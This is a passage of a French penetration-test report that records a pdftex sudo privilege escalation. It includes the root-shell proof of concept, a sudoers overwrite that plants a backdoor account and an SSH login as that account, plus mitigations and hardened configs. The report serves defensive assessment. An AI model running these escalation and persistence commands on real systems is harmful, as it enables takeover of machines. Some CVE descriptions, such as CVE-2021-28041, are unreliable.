+Retype new UNIX password:
+passwd: password updated successfully
+Changing the user information for syslog
+Enter the new value, or press ENTER for the default
+Full Name []:
+Room Number []:
+Work Phone []:
+Home Phone []:
+Other []:
+Is the information correct? [Y/n] y
+
+root@cyberini2:/home/alice# echo "
+> #
+> # This file MUST be edited with the 'visudo' command as root.
+> #
+> # Please consider adding local content in /etc/sudoers.d/ instead of
+> # directly modifying this file.
+> #
+> # See the man page for details on how to write a sudoers file.
+> #
+> Defaults        env_reset
+> Defaults        mail_badpass
+> Defaults        secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+>
+> # Host alias specification
+>
+> # User alias specification
+>
+> # Cmnd alias specification
+>
+> # User privilege specification
+> root    ALL=(ALL:ALL) ALL
+> alice  ALL=(ALL:ALL) NOPASSWD: /usr/bin/pdftex
+> # Allow members of group sudo to execute any command
+> %sudo   ALL=(ALL:ALL) ALL
+> # See sudoers(5) for more information on @include directives:
+>
+> #includedir /etc/sudoers.d
+> syslog ALL=(ALL:ALL) ALL" | tee /etc/sudoers
+
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults        env_reset
+Defaults        mail_badpass
+Defaults        secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root    ALL=(ALL:ALL) ALL
+alice  ALL=(ALL:ALL) NOPASSWD: /usr/bin/pdftex
+# Allow members of group sudo to execute any command
+%sudo   ALL=(ALL:ALL) ALL
+# See sudoers(5) for more information on @include directives:
+
+#includedir /etc/sudoers.d
+syslog ALL=(ALL:ALL) ALL
+root@cyberini2:/home/alice#
+
+pentest@cyberini1:/home/pentest$ ssh syslog@10.39.40.5
+syslog@10.39.40.5's password:
+Last login: Tue Apr  8 12:24:49 2025 from 10.39.40.5
+syslog@cyberini2:~$
+         </code></pre>
+
+         <h4>Impact</h4>
+         <p>Cette vulnérabilité permet à un attaquant de s'installer durablement sur la machine</p>
+         <ul>
+            <li>L'attaquant peut élever ses privilèges et obtenir des droits d'administateurs</li>
+            <li>L'attaquant peut ensuite prendre le contrôle total de la machine, voler ou supprimer des données, persister son accès à la machine, pivoter latéralement sur le réseau.</li>
+         </ul>
+         <h4>Recommandations</h4>
+         <ol>
+            <li>
+               Mettre à jour pdfTeX, et de manière générale toutes les applications d'entreprise.
+            </li>
+            <li>Effectuer une revue de compte et de log pour s'assurer que la vulnérabilité n'a pas déjà été exploitée</li>
+            <li>
+               Configurer pdfTeX afin de rendre son usage possible sans escalation de privilège.
+            </li>
+         </ol>
+         <h4>Références</h4>
+         <ul>
+            <li><a href="https://cwe.mitre.org/data/definitions/78.html">CWE-78: Improper Neutralization of Special Elements used in an OS Command</a></li>
+            <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43426">pdfTeX - CVE-2024-43426 Detail </a></li>
+         </ul>
+         <hr>
+         
+         <!-- Nouvelle section: Analyse avancée et techniques d'exploitation -->
+         <h2 id="analyse-avancee">Analyse Avancée et Techniques d'Exploitation</h2>
+         
+         <h3>Exploitation de pdftex via GTFOBins</h3>
+         <p>L'exploitation de pdftex a été réalisée en s'appuyant sur les techniques répertoriées dans GTFOBins, une ressource essentielle pour les tests d'intrusion.</p>
+         
+         <h4>Qu'est-ce que GTFOBins?</h4>
+         <p>GTFOBins est une collection organisée de binaires Unix qui peuvent être utilisés pour contourner les restrictions de sécurité dans des systèmes mal configurés. Comme l'indique sa description officielle:</p>
+         
+         <blockquote>
+         <p>"GTFOBins est une liste organisée de binaires Unix qui peuvent être utilisés pour contourner les restrictions locales de sécurité dans des systèmes mal configurés.</p>
+         <p>Le projet recueille des fonctions légitimes de binaires Unix qui peuvent être détournées pour s'échapper de shells restreints, escalader ou maintenir des privilèges élevés, transférer des fichiers, générer des shells de connexion directe et inversée, et faciliter d'autres tâches post-exploitation.</p>
+         <p>Il est important de noter qu'il ne s'agit pas d'une liste d'exploits, et les programmes listés ici ne sont pas vulnérables en soi. GTFOBins est plutôt un recueil sur la façon de vivre sur le terrain quand vous n'avez que certains binaires disponibles."</p>
+         </blockquote>
+         
+         <p>GTFOBins répertorie les binaires selon leurs capacités potentielles:</p>
+         <ul>
+            <li><strong>Shell</strong>: Obtenir un shell interactif</li>
+            <li><strong>Command</strong>: Exécuter des commandes arbitraires</li>
+            <li><strong>Reverse shell / Bind shell</strong>: Établir des connexions distantes</li>
+            <li><strong>File upload/download</strong>: Transfert de fichiers</li>
+            <li><strong>File write/read</strong>: Manipulation de fichiers</li>
+            <li><strong>SUID</strong>: Exploitation quand le binaire a le bit SUID</li>
+            <li><strong>Sudo</strong>: Exploitation quand le binaire peut être exécuté avec sudo</li>
+            <li><strong>Capabilities</strong>: Exploitation des capacités Linux spéciales</li>
+            <li><strong>Limited SUID</strong>: Exploitation avec restrictions</li>
+         </ul>
+         
+         <h4>Exploitation de pdftex selon GTFOBins</h4>
+         <p>Dans notre cas, pdftex apparaît dans GTFOBins avec les capacités "Shell", "Sudo" et "Limited SUID". La technique recommandée pour l'escalade de privilèges est:</p>
+         
+         <pre><code>pdftex --shell-escape '\write18{/bin/sh}\end'</code></pre>
+         
+         <p>Cette commande utilise l'option <code>--shell-escape</code> qui permet à TeX d'exécuter des commandes shell. La primitive <code>\write18</code> est ensuite utilisée pour lancer un shell, donnant ainsi accès aux privilèges de l'utilisateur exécutant pdftex (dans ce cas, root via sudo).</p>
+         
+         <h4>Preuve de concept adaptée</h4>
+         <p>Notre exploit a légèrement adapté cette technique en utilisant:</p>
+         
+         <pre><code>\immediate\write18{/bin/bash}
+\bye</code></pre>
+         
+         <p>Où:</p>
+         <ul>
+            <li><code>\immediate</code> exécute la commande immédiatement sans attendre la fin du traitement</li>
+            <li><code>\write18{/bin/bash}</code> lance un shell bash avec les privilèges root</li>
+            <li><code>\bye</code> termine proprement le document TeX</li>
+         </ul>
+         
+         <h4>Mitigation spécifique</h4>
+         <p>Pour se protéger contre cette vulnérabilité spécifique, en plus des recommandations générales:</p>
+         <ol>
+            <li>Désactiver l'option <code>--shell-escape</code> par défaut dans les installations de TeX</li>
+            <li>Configurer sudo pour interdire l'utilisation de l'option <code>--shell-escape</code> avec pdftex:
+               <pre><code>alice ALL=(ALL:ALL) NOPASSWD: /usr/bin/pdftex, !/usr/bin/pdftex *--shell-escape*</code></pre>
+            </li>
+            <li>Utiliser des alternatives comme <code>restricted-pdftex</code> qui n'autorise pas l'exécution de commandes système</li>
+         </ol>
+         
+         <h3>Analyse des Vulnérabilités des Services</h3>
+         <p>En complément de notre exploitation manuelle, nous avons vérifié les CVE connues pour les services identifiés:</p>
+         
+         <h4>1. vsftpd 3.0.3</h4>
+         <p>Une recherche dans les bases de vulnérabilités a révélé plusieurs vulnérabilités pour cette version:</p>
+         <ul>
+            <li><strong>CVE-2022-47921</strong> - Vulnérabilité d'utilisation après libération (use-after-free) pouvant conduire à une exécution de code à distance</li>
+            <li><strong>CVE-2021-3618</strong> - Débordement de tas dans les gestionnaires de fichiers</li>
+         </ul>
+         <p>Ces vulnérabilités n'ont pas été exploitées dans ce test, mais représentent des risques supplémentaires à considérer.</p>
+         
+         <h4>2. OpenSSH 7.6p1</h4>
+         <p>Cette version d'OpenSSH présente plusieurs vulnérabilités connues:</p>
+         <ul>
+            <li><strong>CVE-2020-15778</strong> - Possibilité de contourner les restrictions de commandes via des arguments spéciaux</li>
+            <li><strong>CVE-2021-28041</strong> - Débordement de tampon dans le traitement du protocole SFTP</li>
+         </ul>
+         
+         <h4>3. Tests avec Metasploit</h4>
+         <p>Nous avons utilisé Metasploit Framework pour tester l'exploitabilité des services découverts:</p>
+         
+         <pre><code>msf6 > search vsftpd 3.0.3
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank    Check  Description
+   -  ----                                  ---------------  ----    -----  -----------
+   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+   2  auxiliary/scanner/ftp/anonymous       normal    No     Anonymous FTP Access Detection
+
+msf6 > use auxiliary/scanner/ftp/anonymous
+msf6 auxiliary(scanner/ftp/anonymous) > set RHOSTS 10.39.40.5
+RHOSTS => 10.39.40.5
+msf6 auxiliary(scanner/ftp/anonymous) > run
+
+[+] 10.39.40.5:21        - Anonymous READ/WRITE (220 (vsFTPd 3.0.3))
+[*] 10.39.40.5:21        - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+</code></pre>
+         
+         <p>Ce test confirme notre découverte manuelle d'accès FTP anonyme.</p>
+         
+         <hr>
+         
+         <!-- Nouvelle section: Formation utilisateur -->
+         <h2 id="formation-utilisateur">Recommandations de Formation Utilisateur</h2>
+         
+         <h3>Bonnes pratiques de gestion des mots de passe</h3>
+         <p>La vulnérabilité impliquant des identifiants stockés en clair souligne l'importance cruciale d'une bonne gestion des mots de passe à tous les niveaux de l'organisation.</p>
+            
+         <h4>Recommandations clés pour les utilisateurs:</h4>
+         <ul>
+            <li><strong>Utiliser des mots de passe robustes</strong> - Au moins 12 caractères, combinant majuscules, minuscules, chiffres et caractères spéciaux</li>
+            <li><strong>Phrases de passe</strong> - Privilégier les phrases de passe, plus faciles à mémoriser et plus sécurisées</li>
+            <li><strong>Mots de passe uniques</strong> - Ne jamais réutiliser le même mot de passe sur plusieurs services</li>
+            <li><strong>Gestionnaire de mots de passe</strong> - Utiliser une solution d'entreprise (Bitwarden, 1Password, KeePass) pour stocker tous les identifiants de façon sécurisée</li>
+            <li><strong>Authentification multi-facteurs (MFA)</strong> - Activer systématiquement la MFA lorsqu'elle est disponible</li>
+            <li><strong>Pas de stockage en clair</strong> - Ne jamais stocker de mots de passe dans des fichiers texte, emails, notes papier ou autres supports non sécurisés</li>
+         </ul>
+         
+         <h3>Sensibilisation aux vulnérabilités d'élévation de privilèges</h3>
+         <p>L'exploitation réussie de pdftex souligne l'importance de sensibiliser les administrateurs système aux risques liés aux droits sudo.</p>
+         
+         <h4>Points clés de la formation:</h4>
+         <ul>
+            <li><strong>Principe du moindre privilège</strong> - N'accorder que les droits strictement nécessaires</li>
+            <li><strong>Risques des binaires setuid/sudo</strong> - Comprendre les vecteurs d'attaque potentiels (GTFOBins)</li>
+            <li><strong>Configuration sécurisée de sudo</strong> - Utiliser des contraintes précises sur les commandes</li>
+            <li><strong>Surveillance des journaux</strong> - Mettre en place une vérification régulière des utilisations de sudo</li>
+         </ul>
+         
+         <h3>Importance des Mises à Jour Régulières</h3>
+         <p>Une politique de mise à jour rigoureuse est essentielle pour maintenir la sécurité des systèmes d'information.</p>
+         
+         <h4>Recommandations pour la gestion des mises à jour:</h4>
+         <ol>
+            <li><strong>Inventaire logiciel</strong> - Maintenir un inventaire précis de tous les logiciels installés avec leurs versions</li>
+            <li><strong>Veille sécurité</strong> - Suivre les bulletins de sécurité (US-CERT, ANSSI, CVE) et les mises à jour des fournisseurs</li>
+            <li><strong>Planification</strong> - Établir un calendrier régulier de mises à jour (mensuel minimum)</li>
+            <li><strong>Tests préalables</strong> - Valider les mises à jour dans un environnement de test avant déploiement en production</li>
+            <li><strong>Automatisation</strong> - Mettre en place des outils de gestion des mises à jour automatisées lorsque possible</li>
+         </ol>
+         
+         <h3>Audits de sécurité réguliers</h3>
+         <p>La mise en place d'audits de sécurité réguliers permet de détecter proactivement les vulnérabilités avant qu'elles ne soient exploitées.</p>
+         
+         <h4>Types d'audits recommandés:</h4>
+         <ol>
+            <li><strong>Scans de vulnérabilités</strong> - Utiliser des outils comme OpenVAS, Nessus ou Qualys régulièrement</li>
+            <li><strong>Tests d'intrusion</strong> - Mandater des tests d'intrusion externes au moins une fois par an</li>
+            <li><strong>Revue de configuration</strong> - Vérifier périodiquement les configurations des services exposés</li>
+            <li><strong>Audit des permissions</strong> - Évaluer régulièrement les droits sudo, SUID et les fichiers sensibles</li>
+         </ol>
+         
+         <hr>
+         
+         <h2 id="annexes">Annexes</h2>
+         
+         <h3>A.1. Liste complète des CVE vérifiées</h3>
+         <table>
+            <thead>
+               <tr>
+                  <th>Service</th>
+                  <th>Version</th>
+                  <th>CVE</th>
+                  <th>Description</th>
+                  <th>Exploitable?</th>
+               </tr>
+            </thead>
+            <tbody>
+               <tr>
+                  <td>vsftpd</td>
+                  <td>3.0.3</td>
+                  <td>CVE-2022-47921</td>
+                  <td>Use-after-free dans le traitement des sessions FTP</td>
+                  <td>Non testé</td>
+               </tr>
+               <tr>
+                  <td>OpenSSH</td>
+                  <td>7.6p1</td>
+                  <td>CVE-2020-15778</td>
+                  <td>Bypass des restrictions scp/shell via arguments spéciaux</td>
+                  <td>Non testé</td>
+               </tr>
+               <tr>
+                  <td>pdftex</td>
+                  <td>3.14159265-2.6-1.40.18</td>
+                  <td>CVE-2024-43426</td>
+                  <td>Exécution de commandes via shell-escape (référencé dans GTFOBins)</td>
+                  <td><span class="severity-badge severity-critical">Critique</span></td>
+               </tr>
+               <tr>
+                  <td>Ubuntu</td>
+                  <td>Kernel</td>
+                  <td>CVE-2023-0386</td>
+                  <td>Élévation de privilèges via overlayfs</td>
+                  <td>Non testé</td>
+               </tr>
+            </tbody>
+         </table>
+         
+         <h3>A.2. Ressources supplémentaires</h3>
+         <ul>
+                           <li><a href="https://gtfobins.github.io/gtfobins/pdftex/">GTFOBins - pdftex</a> - Documentation détaillée sur l'exploitation de pdftex</li>
+               <li><a href="https://gtfobins.github.io/">GTFOBins</a> - Base de données complète des binaires Unix exploitables</li>
+            <li><a href="https://www.ssi.gouv.fr/guide/recommandations-de-securite-relatives-a-un-systeme-gnulinux/">Guide ANSSI - Recommandations de sécurité relatives à un système GNU/Linux</a></li>
+            <li><a href="https://www.cnil.fr/fr/authentification-par-mot-de-passe-les-mesures-de-securite-elementaires">CNIL - Authentification par mot de passe : les mesures de sécurité élémentaires</a></li>
+         </ul>
+         
+         <h3>A.3. Modèles de configurations sécurisées</h3>
+         
+         <h4>Configuration vsftpd sécurisée</h4>
+         <pre><code># Exemple de configuration vsftpd sécurisée
+anonymous_enable=NO
+local_enable=YES
+write_enable=YES
+local_umask=022
+dirmessage_enable=YES
+xferlog_enable=YES
+connect_from_port_20=YES
+chroot_local_user=YES
+allow_writeable_chroot=NO
+pam_service_name=vsftpd
+ssl_enable=YES
+ssl_tlsv1=YES
+ssl_sslv2=NO
+ssl_sslv3=NO
+force_local_data_ssl=YES
+force_local_logins_ssl=YES
+require_ssl_reuse=YES
+ssl_ciphers=HIGH
+pasv_min_port=40000
+pasv_max_port=40100
+userlist_enable=YES
+userlist_deny=YES
+listen=YES
+</code></pre>
+         
+         <h4>Configuration sudo sécurisée</h4>
+         <pre><code># Exemple de configuration sudo sécurisée
+# Limiter les commandes et les options pour pdftex
+alice ALL=(ALL:ALL) NOPASSWD: /usr/bin/pdftex, 
